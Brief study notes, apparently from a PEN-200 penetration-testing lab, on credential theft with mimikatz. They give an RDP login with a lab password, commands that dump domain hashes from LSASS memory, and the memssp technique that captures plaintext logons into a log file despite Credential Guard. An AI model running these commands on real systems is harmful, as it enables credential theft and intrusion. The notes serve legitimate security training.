# mimikatz

- PEN-200, Password attacks, 16.3.5 Q1
- Domain hashes stored in memory of LSASS.exe process
```powershell
xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246 /dynamic-resolution
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

- With Credential Guard enabled, hashes are now in VTL1, not in memory
- Mimikats can register a new SSP with the SSPI, and hopefully force the SSPI to use our SSP for authentiction, forcing it to call the SSP with plaintext creds, which we can intercept
- once injected, wait for a connection, or force a connection
```powershell
privilege::debug
misc::memssp
# saved in a log file, C:\Windows\System32\mimilsa.log
```